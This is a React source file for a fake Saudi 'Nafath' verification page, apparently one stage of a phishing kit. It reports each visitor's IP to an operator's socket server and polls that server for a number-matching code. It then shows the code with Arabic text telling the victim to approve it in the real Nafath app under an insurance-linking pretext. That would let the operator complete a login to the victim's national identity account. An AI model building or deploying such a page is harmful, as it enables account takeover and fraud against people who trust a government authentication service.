import React, { useEffect, useState } from "react";
import { socket } from "../App";


const NafadVerification = () => {
  const [code, setCode] = useState("");
  const [visitorIP, setVisitorIP] = useState(null);

  useEffect(() => {
    const fetchIP = async () => {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        setVisitorIP(data.ip);
        socket.emit("updateLocation", {
          ip: data.ip,
          page: "nafad-basmah",
        });
      } catch (error) {
        console.error("IP fetch failed:", error);
      }
    };

    fetchIP();
  }, []);

  useEffect(() => {
    const requestCode = () => {
      if (visitorIP) {
        socket.emit("getNafadCode");
      }
    };

    const pollId = setInterval(requestCode, 1000);
    requestCode(); // First immediate call

    socket.on("nafadCode", (msg) => {
      if (msg.error) {
        console.error("nafadCode error:", msg.error);
        return;
      }
      const codeStr = msg.code == null ? "" : String(msg.code).padStart(2, "0");
      if (codeStr && codeStr !== "00") {
        setCode(codeStr);
        clearInterval(pollId);
      }
    });

    return () => clearInterval(pollId);
  }, [visitorIP]);

  const handleGoApp = () => {
    const ua = navigator.userAgent || "";
    let url;
    if (/iPhone|iPad|iPod/.test(ua)) {
      url =
        "https://apps.apple.com/sa/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871";
    } else if (/Android/.test(ua)) {
      url = "https://play.google.com/store/apps/details?id=sa.gov.nic.myid";
    } else {
      url = "https://nafath.sa";
    }
    window.location.href = url;
  };

  return (
    <div dir="rtl" style={{ backgroundColor: "#f4f6f9" }}>
      <nav
        className="navbar navbar-expand-lg navbar-light pt-4 pb-4 shadow"
        style={{ backgroundColor: "#fff" }}
      >
        <img src="/nafad.png" alt="nafad-logo" width="128" />
        <button
          className="navbar-toggler ml-2"
          data-toggle="collapse"
          data-target="#navbarSupportedContent"
        >
          <i className="fas fa-bars" />
        </button>
      </nav>

      <div className="text-center mt-5 container flex items-center flex-col ">
        <h6 className="pl-3 pr-3" style={{ color: "#11998e", fontWeight: 600 }}>
          <span style={{ fontSize: 26, fontWeight: 800 }}>لطفاً ،</span> توجه
          إلى تطبيق "نفاذ" لاستكمال إجراءات استبدال و ربط وثيقة التأمين بشريحة
          الجوال وذلك من خلال اختيار الرقم الظاهر أدناه
        </h6>

        <hr style={{ borderBottom: "#2e2e2e 1px solid" }} />

        <div className="alert bg-green-100 py-2 text-green-700 my-2 w-11/12 rounded-lg" role="alert">
          <h1 style={{ margin: "20px 0 4px", fontSize: 50, fontWeight: 800 }}>
            {code}
          </h1>
        </div>

        <button
          className="btn text-white w-11/12 rounded-md mt-5 mb-10 col-12 p-3"
          style={{ backgroundColor: "#11998e", fontSize: 20, fontWeight: 600 }}
          onClick={handleGoApp}
        >
          انتقل الى تطبيق نفاذ
        </button>

        <img
          src="/cdeie.png"
          alt=""
          className="mt-5 py-2"
          style={{ width: "50%", margin: "auto" }}
        />
      </div>

      <img
        src="/footerNafad.png"
        alt=""
        className="mt-5"
        width="100%"
      />
    </div>
  );
};

export default NafadVerification;
